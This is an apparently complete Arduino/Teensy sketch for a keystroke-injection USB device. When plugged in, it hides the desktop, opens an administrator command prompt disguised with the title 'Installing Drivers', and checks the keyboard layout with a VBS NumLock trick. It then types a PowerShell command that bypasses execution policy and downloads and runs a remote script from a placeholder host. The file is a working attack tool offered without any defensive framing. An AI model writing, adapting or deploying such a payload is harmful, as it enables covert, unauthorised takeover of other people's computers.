const int ledPin = 11;
extern volatile uint8_t keyboard_leds;

int ledkeys(void)       {return int(keyboard_leds);}
bool checkNUMON(void)    {return ((ledkeys() & 1) == 1) ? true : false;}
bool checkCAPON(void)	{return ((ledkeys() & 2) == 2) ? true : false;}

void offKey(uint8_t key_mod = 0, uint8_t key = 0, int sleep = 0) {
  delay(200);
  Keyboard.set_modifier(0); 
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(sleep);
}

void onAndOffKey(uint8_t key_mod = 0, uint8_t key = 0, int sleep = 0) {
  Keyboard.set_modifier(key_mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();  
  offKey(0,0,sleep);
}

void admin_cmd(void) {
  onAndOffKey(MODIFIERKEY_LEFT_GUI,0,500); // WIN

  Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=18 LINES=1 && title Installing Drivers\"");  
  delay(800);
  
  onAndOffKey(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT, KEY_ENTER, 2000); // Right CTRL+SHIFT+ENTER 

  onAndOffKey(0, KEY_LEFT, 200); // Press Left

  onAndOffKey(0, KEY_ENTER, 600); // Press Enter
}

//win+m
//win+shift+m

void haltError(void)  {onAndOffKey(MODIFIERKEY_ALT, KEY_F4, 200);}// CTRL+F4

bool checkEngInput(void){
  Keyboard.println("echo WScript.CreateObject(\"WScript.Shell\").SendKeys \"{NUMLOCK}\" > %temp%\\yw0.vbs && wscript %temp%\\yw0.vbs");
  delay(500);
  return (checkNUMON()) ? true : false;
}

void changeLanguage(void)   {onAndOffKey(MODIFIERKEY_ALT | MODIFIERKEY_SHIFT, 0, 300);} // ALT+SHIFT
  
void downloadShell(void) {
  Keyboard.println("powershell -ExecutionPolicy Bypass -noLogo -c \"iex (New-Object Net.WebClient).DownloadString('http://BLABLABLA/raw/qq')\"");
  delay(500);
  Keyboard.println("exit"); 
  ledBlink(2,200);
}
  
void ledBlink(int quantity, int time) {
  for(int i=0; i<quantity; i++) {
    delay(time);
    digitalWrite(ledPin,HIGH);
    delay(time);
    digitalWrite(ledPin,LOW);
  }
}

void minAndRevWin(int in = 0)  {in ? onAndOffKey(MODIFIERKEY_LEFT_GUI, KEY_M, 400) : onAndOffKey(MODIFIERKEY_LEFT_GUI | MODIFIERKEY_SHIFT, KEY_M, 400);} // Press WIN+M and WIN+SHIFT+M

void setup(void) {
  pinMode(ledPin, OUTPUT);
  delay(1000);
  ledBlink(4,80);
  checkCAPON() ? onAndOffKey(0, KEY_CAPS_LOCK, 300) : delay(100);
  checkNUMON() ? onAndOffKey(0, KEY_NUM_LOCK, 300) : delay(100);
  minAndRevWin(1);
  admin_cmd();
  if (checkEngInput()) {
    onAndOffKey(0, KEY_NUM_LOCK, 300);
    downloadShell();
  }
  else{
    haltError();
    changeLanguage();
    admin_cmd();
    downloadShell();
  }
  minAndRevWin();   
  offKey(200);
}

void loop(void) {}